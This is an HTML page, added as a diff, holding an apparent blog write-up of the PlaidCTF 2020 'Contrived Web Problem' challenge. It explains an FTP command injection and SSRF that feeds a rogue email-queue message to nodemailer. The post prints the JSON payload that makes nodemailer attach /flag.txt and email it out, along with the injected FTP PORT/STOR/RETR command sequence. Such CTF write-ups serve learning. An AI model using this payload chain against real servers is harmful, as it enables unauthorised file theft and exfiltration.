@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    
+    
+    <title>PlaidCTF 2020: Contrived Web Problem · Jamvie: CTF writeups and more</title>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+    <link rel="stylesheet" href="https://jamvie.net/style.main.min.d17e80797ff527ead27a684535a2ae633c413f520c03a563651145b43345ecf3.css" />
+
+</head>
+<body class=" post-template ">
+
+    <div class="site-wrapper">
+
+<header class="site-header"><div class="outer site-nav-main">
+    <div class="inner"><nav class="site-nav">
+    <div class="site-nav-left">
+        
+            <a class="site-nav-logo" href="https://jamvie.net/">Jamvie: CTF writeups and more</a>
+        
+        
+        <div class="site-nav-content">
+            <ul class="nav" role="menu">
+                
+                <li class="nav-home" role="menuitem"><a href="/about/">About</a></li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</nav>
+
+</div>
+</div></header>
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post  no-image ">
+
+            <header class="post-full-header">
+
+                
+                    
+                    <section class="post-full-tags">
+                        <a href="/tags/writeup">writeup</a>
+                    </section>
+                
+
+                <h1 class="post-full-title">PlaidCTF 2020: Contrived Web Problem</h1>
+
+                
+
+                <div class="post-full-byline">
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+    <li class="author-list-item">
+        <div class="author-card">
+            <div class="author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></div>
+            <div class="author-info">
+                <div class="author-info">
+                    <h2>Jamvie</h2>
+                </div>
+            </div>
+        </div>
+        <a href="#" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></a>
+    </li>
+</ul>
+
+                        <section class="post-full-byline-meta">
+                            
+                                <h4 class="author-name">Jamvie</h4>
+                            
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-124-04">28 April 2020</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!</p>
+
+<p>This was a journey in understanding internet protocols that deepened my knowledge of them to completely new levels, so I&rsquo;m really grateful I got the chance to try this problem out - even though I tried it after the CTF ended :P</p>
+
+<h2 id="let-s-begin">Let&rsquo;s Begin!</h2>
+
+<p>This problem really holds up to its name. The website is simple - you have the option to login or register as a new user.</p>
+
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/CWP01.png" alt="CWP01" /></p>
+
+<p>Uniquely, we are given the source code for the problem. The source code shows us that the program has 6 services:</p>
+
+<pre><code>\services
+    \api 
+    \email (email server, sends emails based on rabbitmq queue)
+    \ftp
+    \postgres (database)
+    \rabbit (email queue, will send requests to the email server)
+    \server
+...
+</code></pre>
+
+<p>Checking out the code, I see that <code>flag.txt</code> is actually mentioned. It&rsquo;s in the services dockerfile, which is only used by <code>api</code>, <code>email</code> and <code>server</code> services. So, the vulnerability probably is within one of these services.</p>
+
+<p>I checked out <code>api</code> first - and I see that the only protocols that it allows are HTTP, HTTPS, and FTP. Aside from the FTP protocol, the other 2 are pretty standard protocols to see in APIs.</p>
+
+<p>Looking at <code>email</code> next, which uses <a href="https://nodemailer.com/about/">nodemailer</a>. I&rsquo;m not too familiar with it, so I check out its documentation:</p>
+
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/CWP02.png" alt="CWP02" /></p>
+
+<p>This seems like a good loophole to exploit - we just need to specify the filepath and nodemailer will send an email with an attachment of whatever file we specified by the filepath, so we can exploit nodemailer&rsquo;s same origin policy. Since the rabbitmq server is the email server&rsquo;s queue, we will send a rogue email request into rabbitmq&rsquo;s queue to serve up to the email server, which will tell it to email us the flag!</p>
+
+<p>Now the hard part - how <em>do we</em> ask the server? How do we send a request to the server to send us the email with the flag as an attachment?</p>
+
+<p>I spent a long time trying to figure out how to send a rogue request to the rabbitmq server that will send us the email we want. I spent hours just browsing through the source code, not really paying attention&hellip;</p>
+
+<p>Until I came across this piece of code in the <code>api/index.ts</code> file:</p>
+
+<pre><code class="language-js">    app.get(&quot;/image&quot;, async (req, res) =&gt; {
+        let { url } = req.query;
+        if (typeof url !== &quot;string&quot;) {
+            return res.status(500).send(&quot;Bad body&quot;);
+        }
+
+        let parsed = new URL(url);
+
+        let image: Buffer;
+        if (parsed.protocol === &quot;http:&quot; || parsed.protocol === &quot;https:&quot;) {
+            const imageReq = await fetch(parsed.toString(), { method: &quot;GET&quot; });
+            image = await (imageReq as any).buffer();
+        } 
+        
+         //THIS PART HERE!
+        else if (parsed.protocol === &quot;ftp:&quot;) {
+            let username = decodeURIComponent(parsed.username);
+            let password = decodeURIComponent(parsed.password);
+            let filename = decodeURIComponent(parsed.pathname);
+            let ftpClient = await connectFtp({
+                host: parsed.hostname,
+                port: parsed.port !== &quot;&quot; ? parseInt(parsed.port) : undefined,
+                user: username !== &quot;&quot; ? username : undefined,
+                password: password !== &quot;&quot; ? password : undefined,
+            });
+            image = await ftpClient.get(filename);
+        } else {
+            return res.status(500).send(&quot;Bad image url&quot;);
+        }
+                if (!isPNG(image)) {
+            return res.status(500).send(&quot;Bad image (not a png)&quot;);
+        }
+
+        res.type(&quot;.png&quot;).status(200).send(image);
+    })
+
+    app.listen(&quot;4101&quot;);
+
+</code></pre>
+
+<p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
+It asks for the username, password and filename, <em>unchecked</em>, then asynchronously asks the server for the image that matches the filename that we specified.
+FTP is a text-based protocol, and since username and password fields are passed to it unchecked, we could definitely inject some protocol commands, custom data (something like <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>), and make FTP send requests that were never intended to be sent.</p>
+
+<p>Here&rsquo;s something I learned in my internet computing class about the FTP protocol: FTP connections have two modes : &ldquo;Active&rdquo; and &ldquo;Passive&rdquo;. I&rsquo;ll give a heavily truncated explanation of the two modes (if you&rsquo;re interested in learning mroe about the FTP protocol, check out the <a href="https://tools.ietf.org/html/rfc959">RFC specifications on it</a>):</p>
+
+<ul>
+<li><p>In active mode, the client will specify the IP of the destination to the server. The FTP server will then send the files to the specified IP. The client establishes the communication channel, tells the server the address to send data to, and the server will then open a data channel to the address.</p></li>
+
+<li><p>In passive mode, the server tells the client where the files will be sent to. In this case, the client will then have to open the data channel as well to get the files. By default, applications running FTP will run on passive mode.</p></li>
+</ul>
+
+<p>The difference in active and passive really lies in the <code>RETR</code> command in the FTP specifications: active-mode <code>RETR</code> makes the client stipulate the destination IP, and passive-mode <code>RETR</code> makes the server stipulate it.</p>
+
+<p>So for this challenge, we can make the FTP client specify the rabbitmq server as the destination IP, and use <code>RETR</code> to make the FTP server send data to rabbitmq.</p>
+
+<p>And since the FTP protocol for this application handles for the uploading and retrieval of profile pictures, we just need to hide our payload (which would ask the rabbitmq server to send an email with the flag.txt file in it to us) in our profile picture, specify FTP to operate on active (using <code>PORT</code> command), and use the <code>RETR</code> command to let the FTP server send our payload to the rabbitmq server!</p>
+
+<p>Okay, I&rsquo;ve explained alot here. This is the attack plan:</p>
+
+<ul>
+<li>Craft a payload that will tell the rabbitmq email queue server to email to us, with flag.txt as the attachment. Hide it in the profile picture (make sure its a png). Upload whatever picture it is as our profile picture.</li>
+</ul>
+
+<p>Here&rsquo;s the payload I crafted (a classic SSRF):</p>
+
+<pre><code>{&quot;to&quot;:&quot;yourEmailGoesHere@example.com&quot;,&quot;text&quot;:&quot;Hello would you like a flag&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}
+</code></pre>
+
+<ul>
+<li><p>Through the username field, input several FTP commands to make the FTP server send our payload to the rabbitmq server. Here, I have made a file called &ldquo;payload.txt&rdquo; that has the post request data with the payload in it:</p>
+
+<pre><code>PASS blah
+PORT 255,255,255,255,80
+STOR payload.txt
+PORT 172,32,56,72,0, 15672      &lt;-----rabbitmq server and port
+RETR payload.txt
+</code></pre></li>
+
+<li><p>Hopefully, the rabbitmq server will send us an email!</p>
+
+<pre><code>PCTF{not_that_contrived_i_guess}
+</code></pre></li>
+</ul>
+
+<p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
+
+<p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
+
+<p>Jam</p>
+                </div>
+            </section>
+
+        </article>
+
+    </div>
+</main>
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+    
+    <article class="read-next-card">
+        <header class="read-next-card-header">
+            <h3><span>More in</span> <a href="/tags/writeup">writeup</a></h3>
+        </header>
+        <div class="read-next-card-content">
+            <ul>
+                
+            </ul>
+        </div>
+    </article>
+<article class="post-card post
+
+
+ ">
+
+        
+            <a class="post-card-image-link" href="https://jamvie.net/posts/03toolsofthetrade/">
+                <img class="post-card-image"src="https://tinyurl.com/syqrnv6" alt="Commonly Used Software"/>
+            </a>
+        
+    
+        <div class="post-card-content">
+    
+            <a class="post-card-content-link" href="https://jamvie.net/posts/03toolsofthetrade/">
+    
+                <header class="post-card-header">
+                    
+                        
+                        <div class="post-card-primary-tag">misc</div>
+                    
+
+                    <h2 class="post-card-title">Commonly Used Software</h2>
+                </header>
+    
+                <section class="post-card-excerpt">
+                    <p><p>I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.</p></p>
+                </section>
+    
+            </a>
+
+            <footer class="post-card-meta">
+                    <ul class="author-list">
+                        <li class="author-list-item">
+                            <div class="author-name-tooltip">Jamvie</div>
+                            <a href="https://jamiepoli.github.io" class="static-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></a>
+                        </li>
+                    </ul>
+                    <div class="post-card-byline-content">
+                        <span>Jamvie</span>
+                        <span class="post-card-byline-date"><time datetime="2020-14-04">26 April 2020</time>
+                            <span class="bull">&bull;</span> 4 min read</span>
+                    </div>
+                </footer>
+    
+        </div>
+
+</article>
+    
+
+            <article class="post-card post
+
+
+ ">
+
+        
+            <a class="post-card-image-link" href="https://jamvie.net/posts/05de1ctf2020_01/">
+                <img class="post-card-image"src="https://images.unsplash.com/photo-1585857188938-2f7ae5afb6f8?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1"/>
+            </a>
+        
+    
+        <div class="post-card-content">
+    
+            <a class="post-card-content-link" href="https://jamvie.net/posts/05de1ctf2020_01/">
+    
+                <header class="post-card-header">
+                    
+                        
+                        <div class="post-card-primary-tag">writeup</div>
+                    
+
+                    <h2 class="post-card-title">De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1</h2>
+                </header>
+    
+                <section class="post-card-excerpt">
+                    <p><p>The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.</p></p>
+                </section>
+    
+            </a>
+
+            <footer class="post-card-meta">
+                    <ul class="author-list">
+                        <li class="author-list-item">
+                            <div class="author-name-tooltip">Jamvie</div>
+                            <a href="https://jamiepoli.github.io" class="static-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></a>
+                        </li>
+                    </ul>
+                    <div class="post-card-byline-content">
+                        <span>Jamvie</span>
+                        <span class="post-card-byline-date"><time datetime="2020-35-05">7 May 2020</time>
+                            <span class="bull">&bull;</span> 8 min read</span>
+                    </div>
+                </footer>
+    
+        </div>
+
+</article>
+    
+        </div>
+    </div>
+</aside>
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://jamvie.net/">Jamvie: CTF writeups and more</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="https://jamvie.net/">Latest Posts</a>
+                    
+                    
+                    <a href="https://github.com/jamiepoli" target="_blank" rel="noopener">Github</a>
+                    <a href="https://jonathanjanssens.com" target="_blank" rel="noopener" style="opacity: 0.5;">Hugo Casper3 by Jonathan Janssens</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+</body>
+</html>
